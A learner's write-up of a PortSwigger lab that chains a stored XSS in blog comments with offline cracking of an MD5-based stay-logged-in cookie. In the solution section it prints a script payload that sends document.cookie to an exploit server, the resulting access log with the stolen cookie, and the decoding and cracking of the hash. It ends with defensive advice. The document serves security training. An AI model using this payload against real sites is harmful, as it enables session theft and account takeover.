# Offline password cracking

**Category:** Web Exploitation — Authentication
**Difficulty:** Practicioner
**Progress:** Solved

---

## Description

**Lab URL:** `https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie`
 
This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

- Your credentials: wiener:peter
- Victim's username: carlos


---

## Reconnaissance

- What does the application do? 
    - The website is a blog about several, seemingly to tech related topics. Users can read and leave comments under blog articles.
- Where is user input accepted? (forms, URL parameters, headers, cookies)
    - There is an account page with a login, the comments below articles can be consideres input too.
- What happens with normal input?
    - Correct user logins log the user in normally, if setting the logged in checkbox it keeps the user logged in for next time

---

## Analysis


#### Vulnerability

The comment section is vulnerable to XSS, as inputting a simple `<b>test</b>` comment shows. The cookie is just readable per JavaScript, keeps a password hash (which is a big problem in of itself) and is also vulnerable due to using a quick to compute unsalted hash algorithm, which makes it trivial and only a matter of time to crack.

---

## Solution 

### Step 1 - Recon / Looking at responses

All the responses when logging in look like from the last lab, not much to see here. The vulnerable comment section is new though.
There is also an exploit server given by the lab. That server has an accesslog tab.
---

### Step 2 - Enumeration / Step 3 - Exploit

Keeping an eye on the accesslog, starting the XSS.
Commenting `<script>document.location='https://exploit-0a0100f503305b7180c5118e012b0079.exploit-server.net/?c='+document.cookie</script>`

works and redirects users to the exploit server. And apparently carlos is a bot since he instantly cicked on the blog post.
```
10.0.3.91       2026-09-25 20:13:50 +0000 "GET /?c=secret=mwZnTYuPLPmg4XadRmtXai9OpRh9z1U8;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
```
This means the secret has the value `mwZnTYuPLPmg4XadRmtXai9OpRh9z1U8` and the stay-logged-in-cookie `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`.
Decoding with base64 returns `carlos:26323c16d5f4dabff3bb136f2460a943`. This is another md5 hash. I tried to crack it with a python program that hashes all the passwords in the candidate passwords list but couldn't do it. But `https://md5.gromweb.com/?md5=26323c16d5f4dabff3bb136f2460a943` told me the password is `onceuponatime`.
Since the task was to login and delete carlos' account I did just that and solved the lab.

---
## Real World Impact

This is a stored XSS meaning, everyone on this website is in danger of compromise. This means that (because of the cookie vulnerability on top) an attacker is able to extract potentially all the passwords of every user on this website.
To protent the stealing of the cookier there is the `httpOnly`-flag. To secure the cookie it should not be based on the users data but some serverside randomized token + using a really resource intensive hash algorithm. And for the XSS there needs to be Context-Specific Output Encoding ("encode on output")

---
## Learnings

- to crack hashes a big rainbowtable or a lot of computing power is needed. A small list might not be enough to find a password even if the hashing dcode works correctly
- fast/cheap hashes are pretty easy to crack